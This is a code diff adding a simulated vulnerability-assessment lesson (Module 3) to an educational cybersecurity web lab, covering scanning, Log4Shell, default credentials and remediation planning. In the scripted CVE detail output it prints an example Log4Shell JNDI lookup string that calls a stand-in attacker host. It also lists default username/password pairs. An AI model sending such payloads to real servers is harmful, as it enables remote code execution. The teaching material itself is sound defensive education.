@@ -211,6 +211,456 @@
   </div>
 </div>
 
-    <div style="font-size:32px;margin:13px 0">🔬</div>
-    <div class="join-sub">Enter your class code and name to join your instructor's session.</div>
-    <div style="background:rgba(0,212,255,.06);border:1px solid rgba(0,212,255,.15);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:16px;text-align:left;">
+</div>
+
+<nav>
+  <img src="kf-logo-dark-bg.png" alt="KnowledgeFlow Cybersafety Foundation" style="height:44px;">
+  <button class="back-btn" onclick="history.back()">← Back</button>
+  <a class="back-btn" href="index.html?skip=1" style="text-decoration:none;">⌂ Home</a>
+  <div class="nav-meta">
+    <span class="badge">Module 3 of 6</span>
+    <span>What's Broken?</span>
+    <button class="sound-toggle" id="soundToggle" onclick="toggleSound()" title="Toggle sound effects">🔊</button>
+    <div style="display:flex;align-items:center;gap:8px;">
+      <span style="font-size:12px;">Progress</span>
+      <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressBar"></div></div>
+    </div>
+  </div>
+  <button id="voiceToggle" class="sound-toggle" onclick="toggleVoice()">🎙️ Voice ON</button>
+</nav>
+
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Mission Brief</div>
+      <div class="scenario-title">🔬 Vulnerability Assessment</div>
+      <div class="scenario-text">
+        The school has a public-facing web server at <strong>192.168.10.50</strong> that hosts the student portal. The IT manager suspects it hasn't been patched in months.<br><br>
+        Your job: run a full vulnerability scan, classify what you find, and create a remediation plan.
+      </div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Objectives</div>
+      <ul class="obj-list" id="objList">
+        <li class="obj-item" id="obj1"><div class="obj-check">1</div><span>Run a basic vulnerability scan</span></li>
+        <li class="obj-item" id="obj2"><div class="obj-check">2</div><span>Identify the critical vulnerabilities</span></li>
+        <li class="obj-item" id="obj3"><div class="obj-check">3</div><span>Check for default credentials</span></li>
+        <li class="obj-item" id="obj4"><div class="obj-check">4</div><span>Create a remediation plan</span></li>
+      </ul>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Vulnerabilities Found</div>
+      <div class="vuln-list" id="vulnList">
+        <div class="vuln-chip critical" id="v1"><div class="vuln-chip-title">CVE-2021-44228</div><div class="vuln-chip-sev">CRITICAL — Log4Shell</div></div>
+        <div class="vuln-chip high" id="v2"><div class="vuln-chip-title">CVE-2022-22965</div><div class="vuln-chip-sev">HIGH — Spring4Shell</div></div>
+        <div class="vuln-chip high" id="v3"><div class="vuln-chip-title">Default Credentials</div><div class="vuln-chip-sev">HIGH — admin/admin</div></div>
+        <div class="vuln-chip medium" id="v4"><div class="vuln-chip-title">TLS 1.0 Enabled</div><div class="vuln-chip-sev">MEDIUM — Outdated encryption</div></div>
+      </div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Need a nudge?</div>
+      <button class="hint-btn" onclick="toggleHint()">💡 Show hint</button>
+      <div class="hint-text" id="hintBox"></div>
+    </div>
+  </aside>
+
+  <div class="terminal-wrap">
+    <div class="terminal-header">
+      <div class="terminal-dots"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+      <span class="terminal-title">analyst@cyberpath:~$ — Nessus Vulnerability Scanner</span>
+    </div>
+    <div class="terminal-output" id="termOut">
+      <div class="t-line t-system">CyberPath Secure Lab — Module 3: Vulnerability Management</div>
+      <div class="t-line t-system">Nessus Professional v10.5 — Simulated environment</div>
+      <div class="t-info">🔬 Target: <strong>192.168.10.50</strong> (School Student Portal). Run a vulnerability scan to find all weaknesses on this server. 💡 Hit <strong>Show hint</strong> in the sidebar if you need the exact command.</div>
+    </div>
+    <div class="terminal-input-row">
+      <span class="terminal-prompt-label">analyst@cyberpath:~$</span>
+      <input class="terminal-input" id="cmdInput" type="text" placeholder="type a command..." autocomplete="off" spellcheck="false"/>
+      <button class="run-btn" onclick="runCommand()">RUN ↵</button>
+    </div>
+  </div>
+
+  <div class="assistant-panel">
+    <div class="assistant-header">
+      <div class="assistant-avatar" id="assistantAvatar">👩‍💻</div>
+      <div><div class="assistant-name" id="assistantName">Alex Morgan</div><div class="assistant-role">Security Engineer</div></div>
+      <div class="online-dot"></div><span class="speaking-indicator" id="speakingIndicator">◉ SPEAKING</span>
+    </div>
+    <div class="assistant-messages" id="assistantMsgs">
+      <div class="msg">Welcome to <strong>Module 3</strong>! Today we're doing <strong>vulnerability scanning</strong> — systematically checking a system for known weaknesses before attackers find them. 🔬</div>
+      <div class="msg">We're using <strong>Nessus</strong>, the industry-standard vulnerability scanner. It checks thousands of known CVEs (Common Vulnerabilities and Exposures) automatically. Run a scan on the target server to find them all. 💡 A hint is available in the sidebar whenever you need the exact command.</div>
+    </div>
+    <div class="tools-ref">
+      <div class="tools-label">Quick commands</div>
+      <span class="tool-chip" onclick="insertCmd('nessus scan 192.168.10.50')">nessus scan</span>
+      <span class="tool-chip" onclick="insertCmd('nessus detail CVE-2021-44228')">nessus detail</span>
+      <span class="tool-chip" onclick="insertCmd('credcheck 192.168.10.50')">credcheck</span>
+      <span class="tool-chip" onclick="insertCmd('remediate 192.168.10.50')">remediate</span>
+      <span class="tool-chip" onclick="insertCmd('help')">help</span>
+    </div>
+  </div>
+</div>
+
+<div class="celebration" id="celebration">
+  <div class="cele-icon">🛡️</div>
+  <div class="cele-title">Vulnerabilities Patched!</div>
+  <div class="cele-sub">You found Log4Shell, Spring4Shell, default credentials and weak encryption — then built a remediation plan to fix them all.<br><br><strong style="color:#10b981;">Skill unlocked: Vulnerability Management</strong></div>
+  <div class="career-section">
+    <div class="career-title">🎯 Where this skill takes you</div>
+    <div class="career-grid">
+      <div class="career-card"><div class="career-card-icon">🔬</div><div class="career-card-title">Vulnerability Analyst</div><div class="career-card-text">Finds and prioritises weaknesses before attackers do.</div></div>
+      <div class="career-card"><div class="career-card-icon">🕵️</div><div class="career-card-title">Penetration Tester</div><div class="career-card-text">Hired to break in legally and report what's exploitable.</div></div>
+      <div class="career-card"><div class="career-card-icon">🛠️</div><div class="career-card-title">Security Engineer</div><div class="career-card-text">Builds and patches the systems that keep data safe.</div></div>
+      <div class="career-card"><div class="career-card-icon">💻</div><div class="career-card-title">AppSec Engineer</div><div class="career-card-text">Secures software before it ever ships to users.</div></div>
+    </div>
+    <div class="career-title" style="margin-bottom:8px;">Certifications that open doors</div>
+    <div class="cert-row">
+      <span class="cert-badge">CompTIA PenTest+</span>
+      <span class="cert-badge">CompTIA Security+</span>
+      <span class="cert-badge">OSCP</span>
+      <span class="cert-badge">CEH</span>
+    </div>
+    <div class="salary-row">💰 Vulnerability Analyst starting salary: $48,000–$75,000 CAD · $60,000–$90,000 US</div>
+  </div>
+  <div style="background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);border-radius:10px;padding:14px 18px;font-size:13px;color:#fcd34d;margin-top:4px;margin-bottom:4px;">📸 <strong>Take a screenshot</strong> of this screen before closing — your progress won't be saved if you come back later.</div>
+  <button class="cele-btn" onclick="window.location.href='module4_cyber_lab.html'">Next: Module 4 →</button>
+  <button class="cele-btn2" onclick="resetLab()">Replay Module 3</button>
+  <div style="margin-top:20px;font-size:11px;color:rgba(125,141,163,.5);letter-spacing:.05em;">CyberPath · Designed &amp; built by <span style="color:var(--accent);opacity:.8;">Adejoke Osuntogun</span></div>
+</div>
+
+<script>
+const state={objectives:{1:false,2:false,3:false,4:false},history:[],historyIdx:-1,scanDone:false};
+
+const out=document.getElementById('termOut');
+function print(html,cls='t-out'){const d=document.createElement('div');d.className=`t-line ${cls}`;d.innerHTML=html;out.appendChild(d);out.scrollTop=out.scrollHeight;}
+function printCmd(cmd){print(`<span class="t-prompt">analyst@cyberpath:~$</span> <span class="t-cmd">${esc(cmd)}</span>`);}
+function printBlank(){const d=document.createElement('div');d.style.height='6px';out.appendChild(d);}
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+let ariaQueue=[];let ariaBusy=false;
+function ariaEnqueue(html,cls){ariaQueue.push({html,cls});processAriaQueue();}
+function processAriaQueue(){if(ariaBusy||ariaQueue.length===0)return;ariaBusy=true;const item=ariaQueue.shift();const b=document.getElementById('assistantMsgs');const d=document.createElement('div');d.className=item.cls;d.innerHTML=item.html;b.appendChild(d);b.scrollTop=b.scrollHeight;setTimeout(()=>{ariaBusy=false;processAriaQueue();},700);}
+function aria(html){ariaEnqueue(html,'msg');}
+function ariaSuccess(html){ariaEnqueue(html,'msg celebrate');}
+function printWOS(title,html){ariaEnqueue(`<div class="wos-title">📺 What's on the screen — ${title}</div>${html}`,'msg wos-box');}
+function printExplainer(html){ariaEnqueue(`<div class="obj-explainer-title">🌍 Real World Connection</div>${html}`,'msg obj-explainer');}
+
+// ---- Sound effects ----
+let audioCtx=null;let soundOn=true;
+function getCtx(){if(!audioCtx){audioCtx=new(window.AudioContext||window.webkitAudioContext)();}if(audioCtx.state==='suspended')audioCtx.resume();return audioCtx;}
+function beep(freq,dur,type='sine',vol=0.08,delay=0){if(!soundOn)return;try{const ctx=getCtx();const t0=ctx.currentTime+delay;const osc=ctx.createOscillator();const gain=ctx.createGain();osc.type=type;osc.frequency.setValueAtTime(freq,t0);gain.gain.setValueAtTime(vol,t0);gain.gain.exponentialRampToValueAtTime(0.001,t0+dur);osc.connect(gain);gain.connect(ctx.destination);osc.start(t0);osc.stop(t0+dur);}catch(e){}}
+function sfxKey(){beep(700,0.04,'square',0.035);}
+function sfxSuccess(){beep(880,0.12,'sine',0.07);beep(1320,0.15,'sine',0.07,0.1);}
+function sfxWarn(){beep(180,0.18,'sawtooth',0.06);}
+function sfxComplete(){beep(660,0.12,'sine',0.08,0);beep(880,0.12,'sine',0.08,0.12);beep(1100,0.12,'sine',0.08,0.24);beep(1320,0.25,'sine',0.09,0.36);}
+function toggleSound(){soundOn=!soundOn;document.getElementById('soundToggle').textContent=soundOn?'🔊':'🔇';soundOn?startAmbient():stopAmbient();}
+// ── Ambient background (cyber hum, drone, blips) ──────────────
+let ambient=null,blipTimer=null;
+function ambTone(freq,dur,type,vol,delay){
+  if(!soundOn)return;
+  try{const c=getCtx(),t0=c.currentTime+(delay||0);
+  const o=c.createOscillator(),g=c.createGain();
+  o.type=type||'sine';o.frequency.value=freq;
+  g.gain.setValueAtTime(vol||0.018,t0);g.gain.exponentialRampToValueAtTime(0.001,t0+dur);
+  o.connect(g);g.connect(c.destination);o.start(t0);o.stop(t0+dur+0.01);}catch(e){}
+}
+function startAmbient(){
+  if(ambient||!soundOn)return;
+  const c=getCtx();
+  const master=c.createGain();
+  master.gain.setValueAtTime(0,c.currentTime);
+  master.gain.linearRampToValueAtTime(0.38,c.currentTime+1);
+  master.connect(c.destination);
+  function makeDrone(freq,vol,detune){
+    const o=c.createOscillator(),g=c.createGain();
+    o.type='sine';o.frequency.value=freq;if(detune)o.detune.value=detune;
+    g.gain.value=vol;o.connect(g);g.connect(master);o.start();return o;
+  }
+  const d1=makeDrone(55,0.55,0),d2=makeDrone(82.4,0.3,3),d3=makeDrone(110,0.15,-2);
+  const lfo=c.createOscillator();lfo.type='sine';lfo.frequency.value=0.06;
+  const lfoG=c.createGain();lfoG.gain.value=0.07;lfo.connect(lfoG);lfoG.connect(master.gain);lfo.start();
+  const bufLen=c.sampleRate*3,buf=c.createBuffer(1,bufLen,c.sampleRate),data=buf.getChannelData(0);
+  for(let i=0;i<bufLen;i++)data[i]=Math.random()*2-1;
+  const ns=c.createBufferSource();ns.buffer=buf;ns.loop=true;
+  const bpf=c.createBiquadFilter();bpf.type='bandpass';bpf.frequency.value=600;bpf.Q.value=0.8;
+  const nsG=c.createGain();nsG.gain.value=0.05;ns.connect(bpf);bpf.connect(nsG);nsG.connect(master);ns.start();
+  const arpNotes=[220,261.6,329.6,392,440,523];let arpStep=0;
+  const arpInterval=setInterval(()=>{
+    if(!soundOn||!ambient){clearInterval(arpInterval);return;}
+    ambTone(arpNotes[arpStep++%arpNotes.length],0.18,'sine',0.018);
+  },480);
+  function scheduleBlip(){
+    if(!ambient)return;
+    blipTimer=setTimeout(()=>{
+      if(soundOn&&ambient){
+        const freqs=[440,523,659,784,1047,1175];
+        const f=freqs[Math.floor(Math.random()*freqs.length)];
+        ambTone(f,0.035+Math.random()*0.05,'square',0.02);
+        if(Math.random()>0.55)setTimeout(()=>ambTone(f*1.5,0.03,'square',0.013),70);
+      }
+      scheduleBlip();
+    },1500+Math.random()*4500);
+  }
+  scheduleBlip();
+  ambient={d1,d2,d3,lfo,ns,master,arpInterval};
+}
+function stopAmbient(){
+  if(blipTimer){clearTimeout(blipTimer);blipTimer=null;}
+  if(!ambient)return;
+  try{const c=getCtx();
+  ambient.master.gain.linearRampToValueAtTime(0,c.currentTime+1);
+  const snap=ambient;
+  setTimeout(()=>{try{snap.d1.stop();snap.d2.stop();snap.d3.stop();snap.lfo.stop();snap.ns.stop();}catch(e){}clearInterval(snap.arpInterval);},1100);}catch(e){}
+  ambient=null;
+}
+function spawnConfetti(){const emojis=['🎉','✨','🔬','🎊','⭐','🛡️'];const container=document.createElement('div');container.style.cssText='position:fixed;inset:0;pointer-events:none;z-index:400;overflow:hidden;';document.body.appendChild(container);for(let i=0;i<28;i++){const span=document.createElement('span');span.textContent=emojis[Math.floor(Math.random()*emojis.length)];span.style.position='absolute';span.style.left=Math.random()*100+'%';span.style.top='-40px';span.style.fontSize=(16+Math.random()*22)+'px';span.style.setProperty('--rot',(Math.random()*360|0)+'deg');const dur=(2.4+Math.random()*1.6).toFixed(2);const del=(Math.random()*0.5).toFixed(2);span.style.animation=`confettiFall ${dur}s ${del}s ease-in forwards`;container.appendChild(span);}setTimeout(()=>container.remove(),4600);}
+function showCelebration(){document.getElementById('celebration').classList.add('show');sfxComplete();spawnConfetti();setTimeout(()=>playAudio('alex_m3_complete.mp3'),2000);}
+
+function printChoices(promptText,choices,onPick){
+  const wrap=document.createElement('div');wrap.className='t-line';
+  const label=document.createElement('div');label.className='t-out accent';label.style.marginBottom='6px';label.textContent=promptText;wrap.appendChild(label);
+  const row=document.createElement('div');row.className='choice-row';
+  choices.forEach(c=>{const b=document.createElement('button');b.className='choice-btn';b.type='button';b.textContent=c.label;b.onclick=()=>{sfxKey();onPick(c,b,row);};row.appendChild(b);});
+  wrap.appendChild(row);out.appendChild(wrap);out.scrollTop=out.scrollHeight;
+}
+
+const HINTS=[
+  'Run a full vulnerability scan against the target server to find all weaknesses. 💡 Command: <code>nessus scan 192.168.10.50</code>',
+  'A critical vulnerability was found. Investigate it to understand exactly how dangerous it is. 💡 Command: <code>nessus detail CVE-2021-44228</code>',
+  'You understand Log4Shell. Now check if there\'s an even simpler way in — like a default password. 💡 Command: <code>credcheck 192.168.10.50</code>',
+  'You\'ve found two critical issues. Click your answer above — which gets patched first?',
+  'Vulnerability prioritised. Now generate the formal remediation plan IT needs to fix everything. 💡 Command: <code>remediate 192.168.10.50</code>',
+  'All objectives complete! Click mission complete to view your results. 🏆'
+];
+function updateHint(){const done=Object.values(state.objectives).filter(Boolean).length;document.getElementById('hintBox').innerHTML=HINTS[Math.min(done,HINTS.length-1)];}
+
+function completeObj(n){if(state.objectives[n])return;state.objectives[n]=true;const el=document.getElementById('obj'+n);el.classList.add('done');el.querySelector('.obj-check').textContent='✓';el.scrollIntoView({behavior:'smooth',block:'nearest'});const done=Object.values(state.objectives).filter(Boolean).length;document.getElementById('progressBar').style.width=(done/4*100)+'%';syncProgress();updateHint();if(done===4){sfxComplete();setTimeout(()=>{const d=document.createElement('div');d.className='t-line';d.style.marginTop='11px';d.innerHTML='<button class="continue-btn" onclick="showCelebration()">✓ Mission complete — View My Results →</button>';out.appendChild(d);out.scrollTop=out.scrollHeight;},900);}else{sfxSuccess();}}
+function revealVuln(id){document.getElementById(id).classList.add('found');}
+
+function presentPriorityDecision(){
+  printChoices('Two critical issues found. Which should you patch FIRST?',[
+    {label:'Log4Shell (CVE-2021-44228) — Remote code execution',correct:true},
+    {label:'Default credentials — admin/admin login',correct:false,why:'Default credentials are serious, but Log4Shell allows full remote code execution without needing ANY credentials at all. CVSS 10.0 RCE always takes priority.'},
+    {label:'Both at the same time — they\'re equally urgent',correct:false,why:'In theory yes, but triage means knowing which is more dangerous right now. Log4Shell gives attackers full control before they even try a password — close that door first.'}
+  ],(choice,btn,row)=>{
+    Array.from(row.querySelectorAll('button')).forEach(x=>x.disabled=true);
+    if(choice.correct){btn.classList.add('correct');}else{sfxWarn();btn.classList.add('wrong');}
+    print(choice.correct
+      ?'✓ Log4Shell first — CVSS 10.0 means full server takeover without any credentials. Change the admin password immediately after.'
+      :'The right priority is Log4Shell. Default credentials are serious, but Log4Shell gives attackers full code execution without needing a login — close the bigger door first.',
+      't-out '+(choice.correct?'highlight':'warn'));
+    printBlank();
+    aria('Correct priority. Now generate the formal remediation plan — that\'s what IT needs to actually fix everything. 💡 Check your hint.');
+  });
+}
+
+function animateScan(cb){
+  const div=document.createElement('div');div.className='scan-progress';
+  div.innerHTML=`<div style="color:var(--accent);margin-bottom:4px">Nessus scan in progress...</div><div class="scan-bar-wrap"><div class="scan-bar-fill" id="scanFill"></div></div><div id="scanStatus" style="color:var(--muted);font-size:12px">Initialising...</div>`;
+  out.appendChild(div);out.scrollTop=out.scrollHeight;
+  const steps=['Checking 45,000 plugins...','Testing web application...','Checking for CVEs...','Testing credentials...','Analysing SSL/TLS...','Compiling results...'];
+  let i=0;let pct=0;
+  const iv=setInterval(()=>{
+    pct=Math.min(100,pct+(Math.random()*18+5));
+    document.getElementById('scanFill').style.width=pct+'%';
+    document.getElementById('scanStatus').textContent=steps[Math.min(i,steps.length-1)];
+    i++;
+    if(pct>=100){clearInterval(iv);document.getElementById('scanStatus').textContent='Scan complete!';setTimeout(cb,600);}
+  },400);
+}
+
+const RESPONSES={
+  'help':()=>{
+    print('Available commands:','t-out accent');
+    print('  nessus scan &lt;ip&gt;         — run full vulnerability scan');
+    print('  nessus detail &lt;CVE-ID&gt;    — get details on a specific CVE');
+    print('  credcheck &lt;ip&gt;            — test for default credentials');
+    print('  remediate &lt;ip&gt;            — generate remediation plan');
+    printBlank();
+    aria('Start with <code>nessus scan 192.168.10.50</code> to find all vulnerabilities on the target!');
+  },
+  'nessus scan 192.168.10.50':()=>{
+    if(state.scanDone){print('Scan already completed. Use nessus detail or credcheck to investigate findings.','t-out warn');return;}
+    state.scanDone=true;
+    printBlank();
+    animateScan(()=>{
+      printBlank();
+      print('NESSUS SCAN RESULTS — 192.168.10.50');
+      print('════════════════════════════════════════');
+      print('');
+      print('CRITICAL (1):');
+      print('  ■ CVE-2021-44228  Log4Shell RCE          CVSS: 10.0','t-out error');
+      print('');
+      print('HIGH (2):');
+      print('  ■ CVE-2022-22965  Spring4Shell RCE        CVSS: 9.8','t-out warn');
+      print('  ■ Default credentials detected            CVSS: 9.1','t-out warn');
+      print('');
+      print('MEDIUM (1):');
+      print('  ■ TLS 1.0 enabled (deprecated protocol)  CVSS: 5.3','t-out accent');
+      print('');
+      print('Total: 4 vulnerabilities | 1 Critical | 2 High | 1 Medium','t-out highlight');
+      printBlank();
+      printWOS('Nessus Scan Results','Each row is one vulnerability found on the target. <strong>CVSS</strong> (Common Vulnerability Scoring System) rates severity from 0–10 — anything above 9.0 is considered critical and needs same-day attention.');
+      revealVuln('v1');revealVuln('v2');revealVuln('v4');
+      completeObj(1);
+      print('[ Objective 1 complete: Vulnerability scan finished ]','t-out highlight');
+      printExplainer('In December 2021, <strong>Log4Shell</strong> (this exact vulnerability) was rated 10.0/10 in severity and affected an estimated 3 billion devices — from Minecraft servers to iCloud. Security teams worked around the clock for weeks patching it.');
+      aria('<strong>4 vulnerabilities found!</strong> The most critical is <strong>Log4Shell (CVE-2021-44228)</strong> — one of the worst vulnerabilities ever discovered. Get the full detail on it to understand exactly what you\'re dealing with. 💡 Check your hint.');
+    });
+  },
+  'nessus detail cve-2021-44228':()=>RESPONSES['nessus detail CVE-2021-44228'](),
+  'nessus detail CVE-2021-44228':()=>{
+    print('');
+    print('CVE DETAIL: CVE-2021-44228 (Log4Shell)');
+    print('══════════════════════════════════════');
+    print('Severity:    CRITICAL (CVSS 10.0 — maximum possible)','t-out error');
+    print('Affected:    Apache Log4j 2.0-beta9 to 2.14.1');
+    print('Component:   Java logging library (Log4j)');
+    print('');
+    print('Description:');
+    print('  Attacker sends a malicious string: ${jndi:ldap://evil.com/x}');
+    print('  Log4j logs the string and triggers a remote code fetch.','t-out error');
+    print('  Result: full remote code execution on the server.','t-out error');
+    print('');
+    print('Fix: Upgrade Log4j to version 2.17.1 or later.','t-out highlight');
+    print('Patch available: YES  |  Exploit public: YES (extremely active)','t-out error');
+    printBlank();
+    printWOS('CVE Detail Report','This is what a CVE (Common Vulnerabilities and Exposures) detail page looks like in real tools. It tells you exactly how the exploit works, which versions are affected, and whether a fix already exists.');
+    completeObj(2);
+    print('[ Objective 2 complete: Critical vulnerability understood ]','t-out highlight');
+    printExplainer('Security teams use CVSS scores to triage hundreds of vulnerabilities every week. A score of 10.0 jumps to the very top of the queue — above almost everything else they\'re tracking.');
+    aria('Log4Shell was discovered in December 2021 and sent the entire security industry into a panic. This server could be fully compromised right now. Now check whether there\'s an even simpler way in — default passwords. 💡 Check your hint.');
+  },
+  'credcheck 192.168.10.50':()=>{
+    print('');
+    print('Credential Check: 192.168.10.50');
+    print('Testing common default username/password combinations...');
+    print('');
+    print('admin / admin        → LOGIN SUCCESSFUL ✗','t-out error');
+    print('admin / password     → Failed');
+    print('root  / root         → Failed');
+    print('admin / 1234         → Failed');
+    print('');
+    print('RESULT: Default credentials active on admin panel!','t-out error');
+    print('Admin panel URL: http://192.168.10.50:8080/admin','t-out warn');
+    printBlank();
+    printWOS('Credential Check Results','Default credentials are usernames/passwords that ship with a product out of the box. Analysts test them first because they\'re free wins for attackers — no hacking skill required, just knowing the manual.');
+    revealVuln('v3');
+    completeObj(3);
+    print('[ Objective 3 complete: Default credentials confirmed ]','t-out highlight');
+    printExplainer('Verizon\'s Data Breach Investigations Report consistently finds that stolen or default credentials are involved in the majority of breaches — they\'re often the easiest way in, far easier than writing an exploit.');
+    aria('🚨 <strong>admin/admin still works!</strong> This is one of the most common mistakes in IT — default credentials are never changed. Combined with Log4Shell, this server is completely exposed. You\'ve found two critical issues — time for your first judgment call: which do you fix first?');
+    setTimeout(()=>presentPriorityDecision(),1200);
+  },
+  'remediate 192.168.10.50':()=>{
+    print('');
+    print('REMEDIATION PLAN — 192.168.10.50','t-out accent');
+    print('Generated: '+new Date().toLocaleString());
+    print('');
+    print('PRIORITY 1 — IMMEDIATE (within 24 hours):','t-out error');
+    print('  1. Patch Log4j to v2.17.1 (CVE-2021-44228)');
+    print('     Command: apt upgrade liblog4j2-java');
+    print('  2. Change admin password (min 16 chars, random)');
+    print('     Current: admin/admin → UNACCEPTABLE');
+    print('');
+    print('PRIORITY 2 — THIS WEEK:','t-out warn');
+    print('  3. Patch Spring framework (CVE-2022-22965)');
+    print('     Update to Spring 5.3.18+ or 5.2.20+');
+    print('  4. Disable TLS 1.0, enable TLS 1.3 only');
+    print('');
+    print('PRIORITY 3 — THIS MONTH:','t-out accent');
+    print('  5. Implement vulnerability scanning schedule (weekly)');
+    print('  6. Set up patch management process');
+    print('  7. Enable web application firewall (WAF)');
+    print('');
+    print('Estimated fix time: 2-4 hours for Priority 1','t-out highlight');
+    print('Risk if unpatched: CRITICAL — remote code execution possible','t-out error');
+    printBlank();
+    printWOS('Remediation Plan Structure','Real remediation plans are organised by priority and timeline, not just a list of fixes. IT teams need to know: what\'s most dangerous, and how fast can we fix it — that\'s what the Priority 1/2/3 bands tell them.');
+    printExplainer('A remediation plan with no priority or deadline rarely gets actioned. Real security teams negotiate fix deadlines (SLAs) with IT based on severity — Critical = 24 hours, High = 1 week, Medium = 1 month.');
+    printBlank();
+    printChoices('IT asks: "How long do we have to patch Log4Shell?" What do you tell them?',[
+      {label:'24 hours — emergency patch tonight',correct:true},
+      {label:'1 week — schedule it in the next sprint',correct:false,why:'A CVSS 10.0 vulnerability with a public exploit cannot wait a week. Every hour it\'s unpatched is an hour attackers can exploit it.'},
+      {label:'1 month — it\'s in the backlog',correct:false,why:'One month for a critical RCE with a public exploit? No. Log4Shell was being actively exploited within hours of disclosure.'},
+      {label:'Next quarter when the budget is available',correct:false,why:'This server could be fully compromised right now. Budget is not a factor when the vulnerability severity is 10.0.'}
+    ],(choice,btn,row)=>{
+      Array.from(row.querySelectorAll('button')).forEach(x=>x.disabled=true);
+      if(choice.correct){btn.classList.add('correct');}else{sfxWarn();btn.classList.add('wrong');}
+      print(choice.correct
+        ?'✓ 24 hours. Log4Shell had a public exploit within hours of disclosure — there is no safe window to delay a CVSS 10.0 patch.'
+        :'The answer is 24 hours. Log4Shell was being actively exploited globally within hours. Any delay is unacceptable for a CVSS 10.0 with a public exploit.',
+        't-out '+(choice.correct?'highlight':'warn'));
+      printBlank();
+      completeObj(4);
+      ariaSuccess('🎉 <strong>Outstanding work!</strong> You ran a professional vulnerability assessment, understood one of the most critical CVEs in history, confirmed default credentials, prioritised your remediation correctly, and set the right patching deadline. That\'s exactly what a real vulnerability analyst does!');
+    });
+  }
+};
+
+function matchCmd(raw){
+  const cmd=raw.trim().toLowerCase().replace(/\s+/g,' ');
+  if(RESPONSES[cmd])return RESPONSES[cmd];
+  if(RESPONSES[raw.trim()])return RESPONSES[raw.trim()];
+  if(cmd.includes('nessus')&&cmd.includes('scan')&&cmd.includes('50'))return RESPONSES['nessus scan 192.168.10.50'];
+  if(cmd.includes('nessus')&&cmd.includes('detail')&&cmd.includes('44228'))return RESPONSES['nessus detail CVE-2021-44228'];
+  if(cmd.includes('nessus')&&cmd.includes('scan'))return ()=>{print('Usage: nessus scan 192.168.10.50','t-out warn');};
+  if(cmd.includes('credcheck')&&cmd.includes('50'))return RESPONSES['credcheck 192.168.10.50'];
+  if(cmd.includes('remediat')&&cmd.includes('50'))return RESPONSES['remediate 192.168.10.50'];
+  if(cmd==='clear')return()=>{out.innerHTML='';print('[ Terminal cleared ]','t-out accent');};
+  return null;
+}
+
+function runCommand(){
+  const input=document.getElementById('cmdInput');const raw=input.value.trim();if(!raw)return;
+  sfxKey();state.history.unshift(raw);state.historyIdx=-1;
+  printCmd(raw);printBlank();
+  const fn=matchCmd(raw);
+  if(fn){fn();}else{print(`bash: ${esc(raw)}: command not found`,'t-out error');aria(`I don't recognise <code>${esc(raw)}</code>. Type <code>help</code> to see available commands.`);}
+  printBlank();input.value='';out.scrollTop=out.scrollHeight;
+}
+
+document.getElementById('cmdInput').addEventListener('keydown',e=>{
+  if(e.key==='Enter'){runCommand();return;}
+  if(e.key==='ArrowUp'){e.preventDefault();if(state.historyIdx<state.history.length-1){state.historyIdx++;document.getElementById('cmdInput').value=state.history[state.historyIdx];}}
+  if(e.key==='ArrowDown'){e.preventDefault();if(state.historyIdx>0){state.historyIdx--;document.getElementById('cmdInput').value=state.history[state.historyIdx];}else{state.historyIdx=-1;document.getElementById('cmdInput').value='';}}
+});
+
+function insertCmd(cmd){document.getElementById('cmdInput').value=cmd;document.getElementById('cmdInput').focus();}
+function toggleHint(){document.getElementById('hintBox').classList.toggle('visible');}
+function resetLab(){location.reload();}
+updateHint();
+document.getElementById('cmdInput').focus();
+
+document.getElementById('overviewModal').addEventListener('click',function(){startAmbient();},{once:true});
+
+let voiceOn=true;let _cachedVoices=[];if(window.speechSynthesis){_cachedVoices=window.speechSynthesis.getVoices();window.speechSynthesis.onvoiceschanged=()=>{_cachedVoices=window.speechSynthesis.getVoices();};}let overviewAudioTimer=null;let currentAudio=null;
+function _showSpeaking(on){const ind=document.getElementById('speakingIndicator');const av=document.getElementById('assistantAvatar');if(ind)ind.classList.toggle('active',on);if(av)av.classList.toggle('speaking',on);}
+function playAudio(src,fallbackText){if(!voiceOn)return;if(window.speechSynthesis)window.speechSynthesis.cancel();if(currentAudio){currentAudio.pause();currentAudio=null;}const a=new Audio(src);currentAudio=a;a.onplay=()=>_showSpeaking(true);a.onended=()=>{_showSpeaking(false);currentAudio=null;};a.onerror=()=>{_showSpeaking(false);currentAudio=null;const t=fallbackText||(document.querySelector('.char-msg')?.textContent||'').replace(/^["“]|["”]$/g,'').trim();if(t)speakText(t);};a.play().catch(()=>{_showSpeaking(false);currentAudio=null;const t=(document.querySelector('.char-msg')?.textContent||'').replace(/^["\u201c]|["\u201d]$/g,'').trim();if(t)speakText(t);});}
+function speakText(text){
+  if(!voiceOn||!window.speechSynthesis)return;
+  window.speechSynthesis.cancel();
+  const clean=text.replace(/[\u{1F000}-\u{1FFFF}\u{2600}-\u{27BF}\u{2B00}-\u{2BFF}\u{FE00}-\u{FEFF}]/gu,'').replace(/\s+/g,' ').trim();
+  if(!clean)return;
+  const utt=new SpeechSynthesisUtterance(clean);
+  utt.rate=1.0;utt.pitch=1.0;utt.volume=1;
+  const _vv=window.speechSynthesis.getVoices();const _voices=_vv.length?_vv:_cachedVoices;const pick=_voices.find(v=>v.name==='Google UK English Male')||_voices.find(v=>v.name==='Google US English')||_voices.find(v=>v.name.toLowerCase().includes('google')&&v.lang.startsWith('en'))||_voices.find(v=>v.name==='Samantha')||_voices.find(v=>v.lang==='en-US'&&!v.name.toLowerCase().includes('compact'));
+  if(pick)utt.voice=pick;
+  utt.onstart=()=>_showSpeaking(true);
+  utt.onend=()=>{_showSpeaking(false);};
+  utt.onerror=()=>_showSpeaking(false);
+  window.speechSynthesis.speak(utt);
+}
+function speakWelcome(){playAudio('alex_m3_welcome.mp3');}
+function speakBriefing(){playAudio('alex_m3_welcome.mp3');}
+
+function startHeartbeat(){if(!state.sessionId)return;
+  let lastActivity=Date.now();
